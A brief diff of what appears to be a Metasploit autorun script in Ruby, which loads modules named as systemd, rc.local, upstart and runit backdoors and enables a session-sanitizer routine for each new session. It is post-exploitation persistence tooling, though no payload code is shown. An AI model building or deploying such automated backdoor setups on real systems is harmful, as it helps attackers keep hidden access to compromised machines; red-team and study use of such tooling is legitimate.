@@ -5,13 +5,14 @@ require '/home/msf/msf-autorunscripts/systemd_backdoor_systemctl'
 require '/home/msf/msf-autorunscripts/sysvinit_backdoor_rc_local'
 require '/home/msf/msf-autorunscripts/upstart_backdoor_conf'
 require '/home/msf/msf-autorunscripts/runit_backdoor_sv'
+require '/home/msf/msf-autorunscripts/session_sanitizer'
 
 fm        = client.framework
 target_ip = client.session_host
 sid       = client.sid
 
 print("\n")
-#SessionSanitizer.run(fm, target_ip, sid)
+SessionSanitizer.run(fm, target_ip, sid)
 print("\n")
 #ShellPromotion.run(fm, sid, target_ip, client)
 print("\n")
